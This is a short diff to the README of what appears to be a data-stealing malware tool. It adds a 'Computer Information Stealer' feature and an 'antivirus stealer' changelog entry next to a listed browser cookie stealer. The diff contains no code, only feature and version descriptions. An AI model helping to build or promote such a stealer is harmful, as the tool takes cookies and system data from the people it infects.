@@ -16,6 +16,8 @@
 
 ## <a id="features"></a>✨・Features
 ```
+🖥️ - Computer Information Stealer: Steal graphic card name (and other data), cpu name (and other data) and more..
+
 🍪 - Cookie Stealer: Steals cookies of any browser
 
 🤖 - Package Installer: Automatically install necessary packages
@@ -51,6 +53,7 @@
 
 ## <a id="changelog"></a>📝・Changelog
 ```
+- V3.7.5 Added antivirus stealer 
 - V3.7.3.1 Removed useless print
 - V3.7.3 Fixed Screenshot
 - V3.7 Make it steal in under 2 seconds
